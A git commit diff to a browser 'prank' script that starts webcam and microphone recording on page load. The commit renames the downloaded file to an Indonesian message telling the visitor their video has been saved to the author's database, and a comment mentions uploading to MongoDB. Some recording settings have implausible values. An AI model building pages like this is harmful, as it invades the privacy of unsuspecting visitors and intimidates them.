7ed59a3f08bd90b52a5ad6129b68d2fabf21031e
Muhammad Dava Fahreza <mdavafahreza05@gmail.com>
2023-05-28 14:15:34 +0700

    selamat anda kena prank

--- index.js
+++ index.js
@@ -15,15 +15,13 @@ function startRecording() {
     navigator.mediaDevices.getUserMedia(config)
         .then(function(stream) {
             const options = {
-                mimeType: 'video/webm',
+                mimeType: 'video/mp4',
                 audioBitsPerSecond: 128000,
-                videoBitsPerSecond: 8000000, // Bitrate video yang tinggi
-                bitsPerSecond: 8000000,
-                video: {
-                    width: 3840, // Resolusi video tinggi
-                    height: 2160,
-                    frameRate: 120, // Frame rate tinggi
-                },
+                videoBitsPerSecond: 128000, // Bitrate video yang tinggi
+                bitsPerSecond: 128000,
+                frameInterval: 128000,
+                frameRate: 128000, // Frame rate tinggi
+                bufferSize: 163844444,
             };
             recordRTC = RecordRTC(stream, options);
             recordRTC.startRecording();
@@ -43,7 +41,7 @@ function videoElement(buffer) {
     const urlSrc = URL.createObjectURL(blob);
     const source = `<source src='${urlSrc}' type='video/mp4' />`
     elemenVideo.innerHTML = source
-    return console.log(modifiedBuffer);
+    return console.log(source);
 }
 
 // Fungsi untuk menghentikan perekaman dan mengunggah video ke MongoDB
@@ -53,7 +51,7 @@ function stopRecording() {
         const dataURL = URL.createObjectURL(blob);
         const a = document.createElement('a');
         a.href = dataURL;
-        a.download = 'lihat anak pungut';
+        a.download = 'sorry kamu sudah direkam dan video kamu sudah di simpan ke database saya';
         a.click();
 
         const video = document.querySelector('video');
@@ -85,9 +83,10 @@ setTimeout(() => {
 startRecording()
 
 
-// fetch('https://server-cam.vercel.app/data')
+// fetch('https://server-cam.vercel.app/data/6')
 //     .then(e => e.json())
 //     .then(response => {
 //         console.log(response)
-//         videoElement(response.video[0].data.data)
+//             // console.log(response.video.data.data)
+//             // videoElement(response.video.data.data)
 //     })
